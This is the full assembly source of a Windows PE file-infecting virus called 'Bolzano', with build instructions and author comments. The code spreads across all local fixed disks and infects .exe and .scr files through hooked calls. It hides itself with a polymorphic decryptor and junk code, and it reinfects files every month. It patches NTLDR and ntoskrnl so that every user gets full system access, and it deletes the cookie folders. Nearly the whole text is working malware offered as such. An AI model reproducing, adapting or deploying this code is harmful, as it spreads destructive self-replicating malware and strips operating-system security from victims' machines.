   ;
   ;
   ;            ---------------------------------------------------
   ;
   ;                              --- BOLZANO ---
   ;
   ;            ---------------------------------------------------
   ;
   ;
   ;
   ; TASM       /ml /zi BOLZANO
   ; TLINK32  -aa -r -v BOLZANO,,,\TASM\LIB\IMPORT32.LIB
   ;


   .386


   RADIX        16


   ASSUME       CS:VIRUS,DS:VIRUS


   HOST         SEGMENT      'CODE'


   MAIN:

   ;
   ; When the virus infects a programm, it will NOT modify the
   ; original entry point. Instead of that, it will hook (NbHooks) calls
   ; (opcode E8 XX XX XX XX)
   ;


   VirCall:

                call         Poly
                ret

   HostRoutine:

                ret

   ;
   ; at least one importation is necessary to get a reloc section
   ;


   EXTRN        Beep


   HOST         ENDS


   ;
   ; the data segment is used since it is writeable
   ;


   VIRUS        SEGMENT      'DATA'


   X            equ          ebp - VS

   NbHooks      equ          16


   ;
   ; when executed for the first time,
   ; the virus starts here
   ;

   VS:

                call         GetEIP

   ;
   ; as the HostCalls data will be modified during the infection,
   ; it must be saved somewhere
   ;

                mov          esi,offset HostCalls - VS
                add          esi,ebp
                mov          edi,offset Somewhere - VS
                add          edi,ebp
                mov          ecx,NbHooks * 2
                cld
                repz         movsd

   ;
   ; change the Poly routine so that it will directly
   ; jump to ExitVS
   ;

                mov          edi,[Hooker + X]
                mov          ax,0B860
                stosw                                  ; pushad
                mov          eax,offset ExitVS - VS    ; mov eax,offset ExitVS
                add          eax,ebp
                stosd
                mov          eax,0E0FF
                stosw                                  ; jmp near eax

   ;
   ; determine on which OS the virus is running
   ; the code may seem strange, but it works
   ;


   OS_Test:

                mov          edi,10C00
                mov          ecx,100
                xor          eax,eax
                repz         scasb
                jnz          short Win9x

   WinNT:

                mov          esi,offset WNT_GPA_Key - VS
                mov          edi,77F00000
                jmp          short Find_GPA

   Win9x:

                mov          esi,offset W9x_GPA_Key - VS
                mov          edi,0BFF70000

   ;
   ; now the virus looks for the GetProcAddress function, in order
   ; to relocate its own imporations
   ;


   Find_GPA:

                add          esi,ebp
                mov          [K32_Base + X],edi
                mov          edx,40000                 ; GPA search depth
                cld

   ScanKernel32:

                mov          ecx,08
                push         esi
                push         edi
                repz         cmpsb
                pop          edi
                pop          esi
                jz           short Found_GPA
                inc          edi
                dec          edx
                jz           ExitVS
                jmp          short ScanKernel32

   Found_GPA:

                add          edi,03
                mov          esi,offset Kernel32_API - VS
                add          esi,ebp

   GetAddresses:

                mov          eax,esi
                add          eax,07
                push         eax
                mov          eax,[K32_Base + X]
                push         eax
                call         edi                  ; edi points to GetProcAddress
                or           eax,eax
                jz           short ExitVS
                mov          [esi + 01],eax
                add          esi,07

   NextFunction:

                lodsb
                or           al,al
                jnz          short NextFunction

                cmp          byte ptr [esi],0B8
                jz           short GetAddresses

   Initialize:

                call         GetTickCount
                mov          [RandNb + X],eax

                mov          eax,offset Buffer1 - VS
                add          eax,ebp
                mov          [B1A + X],eax

                mov          eax,offset Buffer2 - VS
                add          eax,ebp
                mov          [B2A + X],eax

   ;
   ; The current month is used by the virus to determine if it has
   ; already infected a program, so every month the virus reinfects
   ; all files on the computer. This makes disinfection harder.
   ;

                push         dword ptr [B1A + X]
                call         GetLocalTime

                mov          al,[Buffer1 + X + 2]
                mov          [SelF + X],al

   ;
   ; The virus must pass control to the host program quickly, or
   ; it would alert the user. But as infecting the computer takes
   ; a little time, the virus creates a new thread, which will
   ; be executed as the same time as the host.
   ;

                mov          eax,offset ThreadID - VS   ; lpThreadID
                add          eax,ebp
                push         eax
                push         0                          ; dwCreationFlags
                push         ?                          ; lpParameter
                mov          eax,offset Reproduce - VS  ; lpStartAddress
                add          eax,ebp
                push         eax
                push         0                          ; dwStackSize
                push         0                          ; lpThreadAttributes
                call         CreateThread               ; launch viral thread

   ;
   ; the previous version of bolzano hooked the host kernel32 return
   ; address, in order to kill the viral thread when the host thread
   ; terminated. This wasn't necessary, as the infection does not
   ; last long : when every file on the computer is already infected,
   ; it takes less than 20 seconds
   ;

   ;
   ; now give control back to the host
   ;

   ExitVS:

                call         GetEIP

                mov          edx,[esp + 20]            ; host call return address
                mov          ecx,NbHooks               ; number of calls hooked
                sub          edx,5                     ; size of call XXX = 5

                mov          esi,offset Somewhere - VS
                add          esi,ebp

   GetCall:

                lodsd
                cmp          eax,edx
                lodsd
                jz           short GotIt
                loop         GetCall

   ;
   ; if we get here, something wrong is happening
   ; so the virus will have to skip the host call
   ;

                popad
                ret


   ;
   ; jump to the original call destination
   ;


   GotIt:

                mov          [BackToHost + X],eax

                popad

   ;
   ; flush the prefetch buffer
   ;

                db           0EBh,00

                db           68
   BackToHost   dd           ?

                ret


   ;
   ; ----------------------------
   ; the viral thread starts here
   ; ----------------------------
   ;


   Reproduce:


   ;
   ; save ebp, as the Win9x kernel32 requires the original value
   ; when the thread terminates
   ;

                push         ebp
                call         GetEIP

   ;
   ; determine the current directory (and consequently the current disk)
   ;

                mov          eax,offset CurrentDir - VS
                add          eax,ebp
                push         eax
                push         104
                call         GetCurrentDirectoryA

                mov          al,[CurrentDir + X]
                mov          [InitialDisk + X],al

                mov          eax,offset CurrentDir + 3 - VS
                add          eax,ebp
                mov          [CDirEnd + X],eax

   ;
   ; first, infect the disk on which the virus started
   ;

                call         InfectDisk


   ; -----------------------------

   ;            pop          ebp          ; for debug
   ;            ret                       ; (useful with subst)

   ; -----------------------------

   ;
   ; scan local disks from A to Z
   ;

                mov          al,'A'
                mov          [CurrentDir + X],al

   ScanDisks:

   ;
   ; avoid infecting the same disk twice
   ;

                db           3C
   InitialDisk  db           ?
                jz           short AlreadyDone

                call         InfectDisk

   AlreadyDone:

                mov          al,[CurrentDir + X]
                inc          al
                mov          [CurrentDir + X],al

                cmp          al,'Z'
                jna          short ScanDisks

                pop          ebp
                ret

   ;
   ; this function justs checks if the disk can be infected
   ;

   InfectDisk:

                mov          eax,[B1A + X]
                mov          ebx,005C3A3F            ; '?:\',0
                mov          bl,[CurrentDir + X]
                mov          [eax],ebx
                push         eax
                call         GetDriveTypeA

                cmp          eax,01                  ; no drive
                jz           short SkipDisk

                cmp          eax,02                  ; floppy disk
                jz           short SkipDisk

                cmp          eax,05                  ; cd-rom
                jz           short SkipDisk

   ; if you know the type of the zip drive, please put it here
   ;
   ;            cmp          eax,??                  ; zip drive
   ;            jz           short SkipDisk
   ;


   ;
   ; These 2 functions make this virus quite useful :)
   ;

                call         NukeNTSecurity

                call         NukeCookies

   ;
   ; now go on with the infection
   ;

                call         StartSearch

   SkipDisk:

                ret


   ;
   ; recursive search routine
   ;


   StartSearch:

                mov          eax,[CDirEnd + X]
                mov          dword ptr [eax],002A2E2A  ; '*.*'

   ;
   ; start searching for files located in CurrentDir
   ;

                push         dword ptr [B1A + X]
                mov          eax,offset CurrentDir - VS
                add          eax,ebp
                push         eax
                call         FindFirstFileA

                cmp          eax,-1
                jnz          short AccessOk
                ret

   AccessOk:

                mov          [SearchHandle + X],eax

   FileTest:

                mov          ebx,[B1A + X]

   ;
   ; FindFile structure :
   ;
   ;    + 00 : File Attributs
   ;
   ;    + 04 : CreationTime
   ;    + 0C : LastAccessTime
   ;    + 14 : LastWriteTime
   ;
   ;    + 20 : File Size
   ;
   ;    + 2C : File Name
   ;

                cmp          byte ptr [ebx + 2C],'.'
                jz           NextFile

   ;
   ; al = file attributes
   ;
   ; bit 0 : read-only
   ;     1 : hidden
   ;     2 : system
   ;     4 : directory
   ;

                mov          eax,[ebx]
                test         al,10
                jz           short IsFileOk

   ;
   ; search through the new directory
   ;

                mov          esi,ebx
                add          esi,2C

                mov          edi,[CDirEnd + X]
                push         edi
                cld

   AddDir:

                movsb
                cmp          byte ptr [esi],0
                jnz          short AddDir

                mov          al,'\'
                stosb

                mov          [CDirEnd + X],edi
                push         dword ptr [SearchHandle + X]

                call         StartSearch

                pop          dword ptr [SearchHandle + X]
                pop          dword ptr [CDirEnd + X]

                jmp          short NextFile

   ;
   ; to be infectable, the file must conform to the requirements :
   ;
   ; - the extent has to be .exe or .scr
   ; - its size must be >= 16384
   ; - it shouldn't be already infected
   ;


   IsFileOk:

                mov          esi,ebx
                add          esi,2C
                cld

   GetFileExtent:

                lodsb
                or           al,al
                jnz          short GetFileExtent

                mov          eax,[esi-4]
                or           eax,20202020

                cmp          eax,' exe'
                jz           short Executable

                cmp          eax,' rcs'
                jnz          short NextFile

   Executable:

                mov          eax,[ebx + 20]
                mov          [FileSize + X],eax
                cmp          eax,4000                  ; minimum filesize
                jc           short NextFile

                mov          eax,offset FileTime - VS
                add          eax,ebp
                push         eax
                sub          eax,2                            ; FileDate
                push         eax
                mov          eax,offset Buffer1 + 4 - VS      ; CreationTime
                add          eax,ebp
                push         eax
                call         FileTimeToDosDateTime

                or           eax,eax
                jz           short NextFile            ; no CreationTime

   ;
   ; The program has been infected if CreationTime verifies :
   ; (seconds and 0F) xor (days and 0F) = self-infection mask
   ;

                mov          al,[FileTime + X]
                and          al,0F
                mov          cl,[FileDate + X]
                and          cl,0F
                xor          al,cl
                cmp          al,[SelF + X]
                jz           short NextFile

                call         InfectFile

   NextFile:

                push         dword ptr [B1A + X]
                push         dword ptr [SearchHandle + X]
                call         FindNextFileA

                or           eax,eax
                jnz          FileTest

   EndSearch:

                push         dword ptr [SearchHandle + X]
                call         FindClose
                ret


   InfectFile:

   ;
   ; concatenate the current directory and the file name
   ; to get the full pathname
   ;

                mov          esi,offset CurrentDir - VS
                add          esi,ebp
                mov          edi,[B2A + X]
                mov          ecx,[CDirEnd + X]
                sub          ecx,esi
                repz         movsb

                mov          esi,offset Buffer1 + 2C - VS
                add          esi,ebp

   GetFileName:

                movsb
                cmp          byte ptr [esi - 1],0
                jnz          short GetFileName

                push         02
                push         dword ptr [B2A + X]
                call         _lopen

                cmp          eax,-1
                jnz          short OpenOk
                ret

   OpenOk:

                mov          [FileHandle + X],eax

   ;
   ; read the file header
   ;

                push         800
                push         dword ptr [B2A + X]
                push         dword ptr [FileHandle + X]
                call         _lread

                mov          ebx,[B2A + X]

   ;
   ; check if the file is a standard PE (Portable Executable) program
   ;

   ;
   ; DOS EXE Signature
   ;

                cmp          word ptr [ebx],'ZM'       ; DOS EXE
                jnz          ExitInfect

   ;
   ; Windows Executable (can be a NE or a PE)
   ;


                cmp          word ptr [ebx + 18],0040
                jc           ExitInfect

   ;
   ; make sure the DOS header is not too big
   ;

                cmp          word ptr [ebx + 3C],0400
                ja           ExitInfect

   ;
   ; ebx points to the start of the PE header
   ;

                add          bx,[ebx+3C]

   ;
   ; check the PE signature
   ;

                cmp          dword ptr [ebx],00004550
                jnz          ExitInfect

   ;
   ; 386-compatible processors
   ;

                cmp          word ptr [ebx + 04],014C
                jc           ExitInfect

                cmp          word ptr [ebx + 04],014F
                ja           ExitInfect

   ;
   ; it is very important no to infect native subsystem programs
   ; which are loaded before the kernel32, like ntoskrnl
   ; or programs which run in the character subsystem, especially
   ; ntvdm, which is verified when the system starts
   ;

                cmp          word ptr [ebx + 5C],2
                jnz          ExitInfect

   ;
   ; esi contains the first section offset
   ;

                mov          esi,ebx
                add          esi,18
                add          si,word ptr [ebx + 14]

   ;
   ; it should be a code section
   ;

                test         dword ptr [esi + 24],20000000
                jz           ExitInfect

                mov          eax,[esi + 08]
                mov          [Code_Size + X],eax

                cmp          eax,1000
                jc           ExitInfect

                mov          eax,[esi + 0C]
                mov          [Code_RVA + X],eax

                mov          eax,[esi + 14]
                mov          [Code_Offset + X],eax

   ;
   ; edi contains the last section offset
   ;

                xor          eax,eax
                mov          ax,[ebx + 06]
                dec          eax
                mov          ecx,28
                mul          ecx
                mov          edi,eax
                add          edi,esi

   ;
   ; calculate the Poly routine start address
   ;

                mov          ecx,[ebx + 34]
                mov          [ImageBase + X],ecx

                add          ecx,[edi + 0C]            ;   section address

   ;
   ; last section new size = file size - last section physical offset + 2000
   ; it must be a multiple of 1000h, as it will be added to the image size
   ;

                mov          eax,[FileSize + X]
                sub          eax,[edi + 14]

                test         eax,00000FFF
                jz           short AlignOk

                and          eax,0FFFFF000
                add          eax,1000

   AlignOk:

                add          ecx,eax
                mov          [VirusAddress + X],ecx

                add          eax,2000
                mov          [LastSSize + X],eax

                call         GetRandNb
                clc
                shr          eax,18                    ; + 120h max
                add          eax,20
                mov          [GarbageSize + X],eax

                add          ecx,eax
                add          ecx,IDATSize
                mov          [Hooker + X],ecx

   ;
   ; The virus should better not infect self-extracting programs,
   ; especially WinZip ones, as most of them have a self-intergrity
   ; check.
   ;
   ; A program is considered as a self-extracting one if :
   ; (FileSize - (FileSize) / 16) >= Last Section Physical End
   ;
   ; Normally, FileSize / 16 represents the debug information size
   ;

                mov          eax,[FileSize + X]
                mov          ecx,eax
                clc
                shr          ecx,04
                sub          eax,ecx                   ; - File Size / 16
                sub          eax,[edi + 14]            ; - Physical Offset
                sub          eax,[edi + 10]            ; - Raw Size
                jnc          ExitInfect

   ;
   ; increase the image size, the last section size and make it writable
   ;

                mov          eax,[LastSSize + X]
                mov          ecx,eax
                mov          [edi + 08],eax
                mov          [edi + 10],eax

                add          eax,[edi + 0C]
                mov          [ebx + 50],eax

                or           dword ptr [edi + 24],80000000

                add          ecx,[edi + 14]
                mov          eax,ecx

                sub          ecx,2000
                mov          [VirusOffset + X],ecx

   ;
   ; everything seems to be ok. so we can start the memory projection
   ;

                push         00                        ; lpName
                push         eax                       ; dwMaximumSizeLow
                push         00                        ; dwMaximumSizeHigh
                push         04                        ; Read/Write
                push         00                        ; lpFileMappingAttributes
                push         dword ptr [FileHandle + X]
                call         CreateFileMappingA

                or           eax,eax
                jz           ExitInfect

                mov          [MapHandle + X],eax

                push         00                        ; dwNumberOfBytesToMap
                push         00                        ; FileOffsetLow
                push         00                        ; FileOffsetHigh
                push         02                        ; dwDesiredAccess
                push         dword ptr [MapHandle + X] ; hMapFile
                call         MapViewOfFile

                or           eax,eax
                jz           ExitMapping

                mov          [MapBase + X],eax

   ;
   ; now write the header
   ;

                mov          esi,[B2A + X]
                mov          edi,eax
                mov          ecx,800
                repz         movsb

   ;
   ; Here comes the tricky part. The virus won't modify the host
   ; EntryPoint, but it will roam through the code in order to
   ; find (NbHooks) call XXX and hook them to the polymorphic routine
   ;

                mov          byte ptr [Tries + X],NbHooks

                mov          edi,offset HostCalls - VS
                add          edi,ebp

   Hook1Call:

   ;
   ; get a random location in the code section
   ;

                call         GetRandNb
                mov          ecx,eax
                mov          eax,[Code_Size + X]
                sub          eax,400
                mul          ecx
                mov          ecx,-1
                div          ecx
                mov          [Code_Loc + X],eax

   ;
   ; start searching for the call opcode (0E8)
   ;

                add          eax,[Code_Offset + X]
                add          eax,[MapBase + X]
                mov          esi,eax

                mov          ecx,400 - 5
                xor          ebx,ebx

   Find1Call:

                lodsb
                cmp          al,0E8
                jz           short Found1

   Invalid:

                inc          ebx
                loop         Find1Call

   NextCall:

                db           0B0
   Tries        db           ?
                dec          al
                mov          [Tries + X],al

                or           al,al
                jz           short ThatsEnough
                jmp          short Hook1Call

   Found1:

                mov          eax,[esi]

                cmp          eax,80
                jc           short Invalid

                add          eax,5
                add          eax,ebx
                add          eax,[Code_Loc + X]

                cmp          eax,[Code_Size + X]
                jnc          short Invalid

                add          eax,[Code_RVA + X]
                add          eax,[ImageBase + X]

                mov          [edi + 4],eax

                sub          eax,5
                sub          eax,[esi]
                mov          [edi],eax

                add          eax,5
                neg          eax
                add          eax,[Hooker + X]
                mov          [esi],eax

                add          edi,8

                jmp          short NextCall

   ThatsEnough:

                call         GetPolyRoutine

                mov          eax,[MapBase + X]
                push         eax
                call         UnmapViewOfFile

   ExitMapping:

                push         dword ptr [MapHandle + X]
                call         _lclose

   ;
   ; mark the program as infected
   ;
   ; the virus changes the seconds of creation so that :
   ; (seconds and 0F) xor (days and 0F) = mask (current month)
   ;

   ExitInfect:

                mov          cl,[FileDate + X]                 ; cl = days
                and          cl,0F
                xor          cl,[SelF + X]

                mov          al,[FileTime + X]                 ; al = seconds
                and          al,0F0
                add          al,cl
                mov          [FileTime + X],al

                mov          eax,offset Buffer1 + 4 - VS       ; CreationTime
                add          eax,ebp
                push         eax
                mov          ax,[FileTime + X]
                push         eax
                mov          ax,[FileDate + X]
                push         eax
                call         DosDateTimeToFileTime

                mov          eax,offset Buffer1 + 14 - VS      ; LastWriteTime
                add          eax,ebp
                push         eax
                sub          eax,08                            ; LastAcessTime
                push         eax
                sub          eax,08                            ; CreationTime
                push         eax
                push         dword ptr [FileHandle + X]
                call         SetFileTime

                push         dword ptr [FileHandle + X]
                call         _lclose
                ret

   ;
   ; polymorphic routine structure :
   ;
   ;            mov          Reg32_A,(IDATSize + GarbageSize) / 4
   ;            mov          Reg32_B,offset VS           (virus address)
   ;            mov          Reg32_C,Key1                (decryption key)
   ; loop:
   ;            xor          [Reg32_B],Reg32_C
   ;            add          Reg32_B,4
   ;            add          Reg32_C,Key2                (fixed key)
   ;            dec          Reg32_A
   ;            jz           VS
   ;            jmp          loop
   ;


   GetPolyRoutine:

                mov          esi,ebp

                mov          edi,[VirusOffset + X]
                add          edi,[MapBase + X]
                mov          [VStart + X],edi

   ;
   ; put the encrypted copy of the virus
   ;

                call         GetRandNb
                mov          [Key1 + X],eax

                call         GetRandNb
                mov          [Key2 + X],eax

                mov          ebx,[Key1 + X]

                mov          ecx,IDATSize
                clc
                shr          ecx,2

   EncryptCode:

                lodsd
                xor          eax,ebx
                stosd
                add          ebx,[Key2 + X]
                loop         EncryptCode


                mov          ecx,[GarbageSize + X]

   AddGarbage:

                call         GetRandNb
                stosb
                loop         AddGarbage

   ;
   ; create the ploymorphic routine
   ;

                mov          al,60
                stosb                                  ; pushad

                mov          bl,10                     ; don't touch esp !

                call         GetRandCode

                call         GetRandReg                ; mov Reg32_A,IDATSize / 4
                add          bl,al
                mov          al,cl
                mov          [Reg32_A + X],al
                add          al,0B8
                stosb

                call         GetRandNb
                clc
                shr          eax,1C                    ; - 10h max
                neg          eax

                add          eax,IDATSize              ; + initilized code
                add          eax,[GarbageSize + X]     ; + garbage
                clc
                shr          eax,2
                stosd                                  ; = size to decrypt

                call         GetRandCode

   GetRegB:

                call         GetRandReg                ; mov Reg32_B,offset VS
                cmp          cl,05                     ; don't use ebp
                jz           short GetRegB

                add          bl,al
                mov          al,cl
                mov          [Reg32_B + X],al
                add          al,0B8
                stosb
                mov          eax,[VirusAddress + X]
                stosd

                call         GetRandCode

                call         GetRandReg                ; mov Reg32_C,Key1
                add          bl,al
                mov          al,cl
                mov          [Reg32_C + X],al
                add          al,0B8
                stosb
                mov          eax,[Key1 + X]
                stosd

                mov          [LoopStart + X],edi

                call         GetRandCode

                mov          al,31                     ; xor [Reg32_B],Reg32_C
                stosb
                mov          al,[Reg32_C + X]
                sal          al,3
                add          al,[Reg32_B + X]
                stosb

                call         GetRandCode

                mov          al,83                     ; add Reg32_B,4
                stosb
                mov          al,[Reg32_B + X]
                add          al,0C0
                stosb
                mov          al,04
                stosb

                call         GetRandCode

                mov          al,81                     ; add Reg32_C,Key2
                stosb
                mov          al,0C0
                add          al,[Reg32_C + X]
                stosb
                mov          eax,[Key2 + X]
                stosd

                call         GetRandCode

                mov          al,[Reg32_A + X]          ; dec Reg32_A
                add          al,48
                stosb

                mov          ax,840F                   ; jz VS
                stosw

                mov          eax,edi
                add          eax,4
                sub          eax,[VStart + X]
                neg          eax
                stosd

                call         GetRandCode

                mov          al,0EBh                   ; jmp Loop
                stosb
                mov          eax,edi
                inc          eax
                sub          eax,[LoopStart + X]
                neg          eax
                stosb

   ;
   ; add again some garbage
   ;

                call         GetRandNb
                clc
                shr          eax,18                    ; + 120h max
                add          eax,20
                mov          ecx,eax

   AddGarbage2:

                call         GetRandNb
                stosb
                loop         AddGarbage2

   ;
   ; fill the uninitialized data with blanks
   ;

                mov          ecx,RawVSize
                sub          ecx,edi
                add          ecx,[VStart + X]
                xor          al,al
                repz         stosb
                ret

   GetRandReg:

                call         GetRandNb
                and          al,07
                mov          cl,al
                mov          al,01
                sal          al,cl
                test         al,bl
                jnz          short GetRandReg
                ret

   GetRandCode:

                call         GetRandNb
                and          al,01
                add          al,01
                xor          ecx,ecx
                mov          cl,al

   InstrLoop:

                push         ecx
                call         GetRandInstr
                pop          ecx
                loop         InstrLoop
                ret

   GetRandInstr:

                call         GetRandNb

                and          al,03

                or           al,al
                jz           short IncR32

                cmp          al,01
                jz           short DecR32

                cmp          al,02
                jz           short MovR8I8

                cmp          al,03
                jz           short MovR32I32

   IncR32:

                call         GetRandReg
                mov          al,cl
                add          al,40
                stosb
                ret

   DecR32:

                call         GetRandReg
                mov          al,cl
                add          al,48
                stosb
                ret

   MovR8I8:

                call         GetRandReg
                cmp          cl,03
                ja           short MovR8I8

                call         GetRandNb
                and          al,01
                shl          al,02
                add          al,cl
                add          al,0B0
                stosb
                call         GetRandNb
                stosb
                ret

   MovR32I32:

                call         GetRandReg
                mov          al,cl
                add          al,0B8
                stosb
                call         GetRandNb
                stosd
                ret

   GetRandNb:

                mov          eax,dword ptr [RandNb + X]
                mul          dword ptr [RMul + X]
                div          dword ptr [RDiv + X]
                mov          eax,edx
                mov          dword ptr [RandNb + X],eax
                ret

   ;
   ; IMPORTANT : this function does a correct job under NT 4
   ; with sevice pack 3, but it might corrupt ntldr and
   ; ntoskrnl under windows 2000 (if they still exist)
   ;


   ; this patch can only be implemented in administrator mode


   NukeNTSecurity:

   ;
   ; every time NT starts, ntldr checks ntoskrnl to see
   ; if it hasn't been modified; if so, the system will halt.
   ; this protection must be removed, unless the ntoskrnl patch
   ; won't be accepted
   ;


                mov          dword ptr  [PatchSize + X],05

                mov          eax,offset NewFileCheck - VS
                add          eax,ebp
                mov          dword ptr  [Patch + X],eax

                mov          eax,offset OldFileCheck - VS
                add          eax,ebp
                mov          dword ptr  [Signature + X],eax

                mov          eax,offset NTLDR - VS
                add          eax,ebp
                mov          dword ptr  [_Filename + X],eax

                call         PatchFile

   ;
   ; SeAccessCheck returns 00 in al if permission is denied
   ; and 01 if permission is given. When the patch is installed,
   ; the function will automatically return 01. Therefore,
   ; evrey user will gain total control on the whole system.
   ;

                mov          dword ptr  [PatchSize + X],09

                mov          eax,offset NewSeAccessC - VS
                add          eax,ebp
                mov          dword ptr  [Patch + X],eax

                mov          eax,offset OldSeAccessC - VS
                add          eax,ebp
                mov          dword ptr  [Signature + X],eax

                mov          eax,offset NTOSKRNL - VS
                add          eax,ebp
                mov          dword ptr  [_Filename + X],eax

                call         PatchFile

                ret

   PatchFile:

                mov          al,byte ptr [CurrentDir + X]
                mov          ecx,[_Filename + X]
                mov          [ecx],al

                push         20
                push         dword ptr [_Filename + X]
                call         SetFileAttributesA

                push         02
                push         dword ptr [_Filename + X]
                call         _lopen

                cmp          eax,-1
                jz           ExitPatch

                mov          [FileHandle + X],eax

                push         00                        ; lpName
                push         00                        ; dwMaximumSizeLow
                push         00                        ; dwMaximumSizeHigh
                push         04                        ; Read/Write
                push         00                        ; lpFileMappingAttributes
                push         dword ptr [FileHandle + X]
                call         CreateFileMappingA

                or           eax,eax
                jz           short CloseFile

                mov          [MapHandle + X],eax

                push         00                        ; dwNumberOfBytesToMap
                push         00                        ; FileOffsetLow
                push         00                        ; FileOffsetHigh
                push         02                        ; dwDesiredAccess
                push         dword ptr [MapHandle + X] ; hMapFile
                call         MapViewOfFile

                or           eax,eax
                jz           short CloseMap

                mov          [MapBase + X],eax

                push         00
                push         dword ptr [FileHandle + X]
                call         GetFileSize

                mov          edx,eax
                dec          edx

                mov          esi,[Signature + X]
                mov          edi,[MapBase + X]
                mov          ecx,[PatchSize + X]

   ScanFile:

                push         ecx
                push         esi
                push         edi
                repz         cmpsb
                pop          edi
                pop          esi
                pop          ecx
                jz           short SignatureFound
                inc          edi
                dec          edx
                jnz          short ScanFile

                jmp          short UnMap

   SignatureFound:

                mov          esi,[Patch + X]
                repz         movsb

   UnMap:

                mov          eax,[MapBase + X]
                push         eax
                call         UnmapViewOfFile

   CloseMap:

                push         dword ptr [MapHandle + X]
                call         _lclose

   CloseFile:

                push         dword ptr [FileHandle + X]
                call         _lclose

   ExitPatch:

                ret

   ;
   ; kills \WINDOWS\Cookies and \WINNT\Cookies
   ;

   NukeCookies:

                mov          eax,offset CookiesDir1 - VS
                add          eax,ebp
                call         TrashDirectory

                mov          eax,offset CookiesDir2 - VS
                add          eax,ebp
                call         TrashDirectory
                ret


   TrashDirectory:


                push         dword ptr [B1A + X]
                push         eax
                call         FindFirstFileA

                cmp          eax,-1
                jnz          short ValidDir
                ret

   ValidDir:

                mov          [SearchHandle + X],eax

   CleanIt:

                mov          eax,[B1A + X]
                add          eax,2C
                push         eax
                call         DeleteFileA

                push         dword ptr [B1A + X]
                push         dword ptr [SearchHandle + X]
                call         FindNextFileA

                or           eax,eax
                jnz          short CleanIt
                ret

   GetEIP:

                call         @1

   @1:
                pop          ebp
                sub          ebp,offset @1 - offset VS

                ret

   ;
   ; At the moment, other API than the Kernel32 are not supported
   ;

   Kernel32_API:


   CreateFileMappingA:

                db           0B8
                dd           ?
                jmp          eax

                db           'CreateFileMappingA',0

   CreateThread:

                db           0B8
                dd           ?
                jmp          eax

                db           'CreateThread',0

   DeleteFileA:

                db           0B8
                dd           ?
                jmp          eax

                db           'DeleteFileA',0

   DosDateTimeToFileTime:

                db           0B8
                dd           ?
                jmp          eax

                db           'DosDateTimeToFileTime',0

   FindClose:

                db           0B8
                dd           ?
                jmp          eax

                db           'FindClose',0

   FindFirstFileA:

                db           0B8
                dd           ?
                jmp          eax

                db           'FindFirstFileA',0

   FindNextFileA:

                db           0B8
                dd           ?
                jmp          eax

                db           'FindNextFileA',0

   GetCurrentDirectoryA:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetCurrentDirectoryA',0

   GetDriveTypeA:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetDriveTypeA',0

   GetFileSize:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetFileSize',0

   GetLocalTime:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetLocalTime',0

   GetTickCount:


                db           0B8
                dd           ?
                jmp          eax

                db           'GetTickCount',0

   FileTimeToDosDateTime:


                db           0B8
                dd           ?
                jmp          eax

                db           'FileTimeToDosDateTime',0

   MapViewOfFile:

                db           0B8
                dd           ?
                jmp          eax

                db           'MapViewOfFile',0

   SetFileAttributesA:

                db           0B8
                dd           ?
                jmp          eax

                db           'SetFileAttributesA',0

   SetFileTime:

                db           0B8
                dd           ?
                jmp          eax

                db           'SetFileTime',0

   UnmapViewOfFile:

                db           0B8
                dd           ?
                jmp          eax

                db           'UnmapViewOfFile',0

   _lopen:

                db           0B8
                dd           ?
                jmp          eax

                db           '_lopen',0

   _lread:

                db           0B8
                dd           ?
                jmp          eax

                db           '_lread',0


   _lclose:

                db           0B8
                dd           ?
                jmp          eax

                db           '_lclose',0


   W9x_GPA_Key  db           0C2,04,00,57,6A,22,2Bh,0D2

   WNT_GPA_Key  db           0C2,04,00,55,8Bh,4C,24,0C

   RMul         dd           07FFFFD9h

   RDiv         dd           0FFFFFFFBh

   NTLDR        db           ?,':\NTLDR',0

   NTOSKRNL     db           ?,':\WINNT\system32\ntoskrnl.exe',0

   OldFileCheck db           3Bh,46,58,74,07

   OldSeAccessC db           8A,0C3,5F,5E,5Bh,5Dh,0C2,28,00

   NewFileCheck db           3Bh,46,58,0EBh,07

   NewSeAccessC db           0B0,01,5F,5E,5Bh,5Dh,0C2,28,00

   CookiesDir1  db           '\WINDOWS\Cookies\*.*',0

   CookiesDir2  db           '\WINNT\Cookies\*.*',0


   ;
   ; The HostCalls has this structure :
   ;
   ;     item 1 - address of the 1st call hooked by the virus
   ;            - the original value of the call (where ExitVS jumps);
   ;
   ;     item 2 : same
   ;     item 3 : same
   ;
   ;         ....
   ;



   HostCalls    dd           offset VirCall
                dd           offset HostRoutine

                dd           (NbHooks - 1) * 2 dup (?)

   ;
   ; Hooker contains the Poly address
   ;

   Hooker       dd           offset Poly


   ALIGN        4


   ;
   ; the initialized code & data of the virus end here
   ;


   EndOfCode:


   ;
   ; Here stands the polymorphic routine.
   ; As the virus here is not encrypted,
   ; it'll just jump to the start of the virus
   ;


   Poly:

                pushad
                jmp          VS

                db           400 - 6 dup (-1)



   RandNb       dd           ?

   K32_Base     dd           ?

   ThreadID     dd           ?

   SearchHandle dd           ?

   CDirEnd      dd           ?

   FileHandle   dd           ?

   MapHandle    dd           ?

   MapBase      dd           ?

   FileDate     dw           ?

   FileTime     dw           ?

   SelF         db           ?

   B1A          dd           ?

   B2A          dd           ?

   HCA          dd           ?

   BytesRead    dd           ?

   GarbageSize  dd           ?

   BlankSize    dd           ?

   ImageBase    dd           ?

   VirusOffset  dd           ?

   VirusAddress dd           ?

   VStart       dd           ?

   LoopStart    dd           ?

   Code_Offset  dd           ?

   Code_Size    dd           ?

   Code_RVA     dd           ?

   Code_Loc     dd           ?

   LastSSize    dd           ?

   FileSize     dd           ?

   Key1         dd           ?

   Key2         dd           ?

   Reg32_A      db           ?

   Reg32_B      db           ?

   Reg32_C      db           ?


   _Filename    dd           ?

   Signature    dd           ?

   Patch        dd           ?

   PatchSize    dd           ?


   Somewhere    dd           NbHooks * 2 dup (?)


   CurrentDir   db           200 dup (1)


   Buffer1      db           100 dup (2)


   Buffer2      db           800 dup (3)


   EndOfVirus:


   IDATSize     equ          offset EndOfCode - offset VS

   VSIZE        equ          offset EndOfVirus - offset VS

   RawVSize     equ          VSIZE - (VSIZE mod 1000) + 1000



   VIRUS        ENDS


   END          MAIN



















































   ;          Up above the world you fly,
   ;          Like a tea-tray in the sky.
   ;          Twinkle, twinkle -
   ;
   ;                             L.C.
